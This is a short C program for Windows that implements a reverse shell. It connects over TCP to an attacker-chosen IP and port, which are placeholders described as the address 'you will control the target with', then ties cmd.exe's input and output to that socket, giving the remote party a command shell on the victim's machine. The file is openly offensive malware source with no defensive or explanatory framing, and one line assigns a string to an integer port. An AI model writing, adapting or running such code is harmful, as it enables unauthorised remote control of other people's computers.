#define WIN32_LEAN_AND_MEAN
#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>
#include <stdio.h>
#pragma comment(lib,"ws2_32.lib")

int main(){
    SOCKET shell;
    struct sockaddr_in sadr;
    WSADATA was;
    STARTUPINFO  si;
    PROCESS_INFORMATION  pi;
    char RecvServer[512];
    int connection;
    char ip_adder[] = "Your IP that you will control the target with"; //ip
    int port = "Your port that you will control the target with ex: 8081 ";
    WSAStartup(MAKEWORD(2, 2), &was); // initialize winsock
    shell = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0); // create a tcp socket

    sadr.sin_port = htons(port); // set port
    sadr.sin_family = AF_INET; // set protocol
    sadr.sin_addr.s_addr = inet_addr(ip_adder); // set ip

    connection = WSAConnect(shell,(SOCKADDR*)&sadr,sizeof(sadr),NULL,NULL,NULL,NULL);
    if(connection == SOCKET_ERROR){
        printf("[!] Connection to the target Failed");
        exit(0);
    }
    else{
        recv(shell,RecvServer,sizeof(RecvServer),0);
        memset(&si,0,sizeof(si));
        si.cb = sizeof(si);
        si.dwFlags = (STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW);
        si.hStdInput = si.hStdOutput = si.hStdError = (HANDLE) shell; // pipe std i/o/er to the socket
        CreateProcess(NULL, "cmd.exe",NULL,NULL,TRUE,0,NULL,NULL,&si,&pi);// spawn cmd 
        WaitForSingleObject(pi.hProcess, INFINITE);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        memset(RecvServer,0,sizeof(RecvServer));
    }
}